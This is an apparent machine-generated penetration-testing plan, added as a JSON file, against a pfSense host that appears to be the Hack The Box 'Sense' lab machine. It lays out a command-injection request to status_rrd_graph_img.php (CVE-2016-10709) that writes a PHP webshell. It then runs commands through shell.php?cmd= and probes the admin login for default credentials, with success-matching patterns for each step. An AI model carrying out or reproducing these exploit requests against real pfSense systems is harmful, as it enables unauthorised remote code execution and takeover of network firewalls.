@@ -1,0 +1,138 @@
+{
+  "plan_id": "plan_1734668889_001",
+  "target_ip": "10.129.2.25",
+  "context_hash": "pfsense_lighttpd_1435_freebsd_weak_highvalue",
+  "attack_vectors": [
+    {
+      "vector_id": "vec_01",
+      "priority": 1,
+      "action": {
+        "tool_name": "web_requester",
+        "command_template": "GET /status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+{base64_payload}>shell.php HTTP/1.1",
+        "parameters": {
+          "target": "10.129.2.25",
+          "port": 443,
+          "path": "/status_rrd_graph_img.php",
+          "method": "GET"
+        },
+        "timeout_seconds": 30
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "RCE",
+          "mitre_id": "T1190",
+          "cve_id": "CVE-2016-10709"
+        },
+        "hypothesis": {
+          "confidence_score": 0.88,
+          "rationale_tags": [
+            "pfsense_identified",
+            "lighttpd_1435_vulnerable",
+            "command_injection_endpoint",
+            "manual_bypass_known"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "status_code_and_content",
+          "match_pattern": "(200 OK|shell created|php uploaded)",
+          "negative_pattern": "(403 Forbidden|404 Not Found|filtering detected)"
+        }
+      },
+      "rag_context": {
+        "payload_snippet": "/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;echo+",
+        "insight": "Successful exploitation of pfSense RCE vulnerability via command injection in status_rrd_graph_img.php parameter, requiring manual payload encoding to bypass filtering.",
+        "exploitation_logic": "Manual exploitation with Base64-encoded PHP payload to bypass strict input filtering and compatibility issues with public exploits",
+        "vulnerability_context": "pfSense lighttpd 1.4.35 contains command injection in database parameter of status_rrd_graph_img.php endpoint",
+        "source": "htb_sense1_writeup"
+      }
+    },
+    {
+      "vector_id": "vec_02",
+      "priority": 2,
+      "action": {
+        "tool_name": "web_requester",
+        "command_template": "GET /shell.php?cmd={command} HTTP/1.1",
+        "parameters": {
+          "target": "10.129.2.25",
+          "port": 443,
+          "path": "/shell.php",
+          "method": "GET"
+        },
+        "timeout_seconds": 30
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "Command_Execution",
+          "mitre_id": "T1059",
+          "cve_id": "CVE-2016-10709"
+        },
+        "hypothesis": {
+          "confidence_score": 0.85,
+          "rationale_tags": [
+            "webshell_uploaded",
+            "php_execution",
+            "pfsense_web_directory"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "command_output",
+          "match_pattern": "(uid=|root|www|FreeBSD)",
+          "negative_pattern": "(command not found|php error|access denied)"
+        }
+      },
+      "rag_context": {
+        "payload_snippet": "shell.php?cmd=",
+        "insight": "Access created php file with cmd parameter to execute commands after successful upload",
+        "exploitation_logic": "Execute arbitrary commands through uploaded PHP webshell in pfSense web directory",
+        "vulnerability_context": "Webshell execution in /usr/local/www directory after successful command injection",
+        "source": "htb_sense1_writeup"
+      }
+    },
+    {
+      "vector_id": "vec_03",
+      "priority": 3,
+      "action": {
+        "tool_name": "web_requester",
+        "command_template": "GET /{admin_interface} HTTP/1.1",
+        "parameters": {
+          "target": "10.129.2.25",
+          "port": 80,
+          "path": "/",
+          "method": "GET"
+        },
+        "timeout_seconds": 30
+      },
+      "prediction_metrics": {
+        "classification": {
+          "attack_type": "Information_Gathering",
+          "mitre_id": "T1083",
+          "cve_id": "N/A"
+        },
+        "hypothesis": {
+          "confidence_score": 0.75,
+          "rationale_tags": [
+            "pfsense_interface",
+            "authentication_bypass_potential",
+            "default_credentials"
+          ],
+          "expected_success": true
+        },
+        "success_criteria": {
+          "match_type": "content_analysis",
+          "match_pattern": "(pfSense|login|admin|authentication)",
+          "negative_pattern": "(connection refused|timeout)"
+        }
+      },
+      "rag_context": {
+        "payload_snippet": "N/A",
+        "insight": "pfSense web interface enumeration for authentication bypass opportunities",
+        "exploitation_logic": "Identify admin login interfaces and potential default credential access",
+        "vulnerability_context": "pfSense administrative interface often exposed with default or weak authentication",
+        "source": "htb_sense1_writeup"
+      }
+    }
+  ],
+  "created_at": "2024-12-20T05:21:29Z"
+}
